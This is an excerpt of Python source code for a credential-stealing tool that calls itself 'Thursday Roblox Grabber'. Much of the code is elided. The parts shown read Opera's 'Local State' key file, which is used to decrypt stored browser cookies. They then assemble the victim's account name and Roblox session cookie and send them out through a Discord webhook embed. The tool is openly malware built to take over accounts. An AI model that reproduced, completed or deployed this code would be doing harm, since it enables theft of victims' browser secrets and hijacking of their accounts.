    ...
    def __init__(self):
        ...
        for pvth in self.paths:
            if "Opera Software" in pvth:
                try:
                    key = self._____(os.path.join(pvth, "Local State"))
...
:bust_in_silhouette: ``Account Of : {NAME} ({DISPLAYNAME})``"""
    ...
    ``|_``:cookie: ``Roblox Cookie : {c}``"""
            webhook = DiscordWebhook(url=wbh, username="Thursday Roblox Grabber", avatar_url=r"https://cdn.discordapp.com/attachments/1095019613219205204/1095830692446867497/f6f3d3978903a4c90c107e826870f5a1.gif")
            embed = DiscordEmbed(title=f"Thursday Roblox Grabber", description=self.content, color='000000')
            embed.set_author(name="author : vesper x thursday", icon_url=r'https://cdn.discordapp.com/attachments/1095019613219205204/1095830692446867497/f6f3d3978903a4c90c107e826870f5a1.gif')
            embed.set_thumbnail(url=IMAGE)
            embed.set_image(url="https://cdn.discordapp.com/attachments/1095019613219205204/1095830692446867497/f6f3d3978903a4c90c107e826870f5a1.gif")
            embed.set_timestamp()
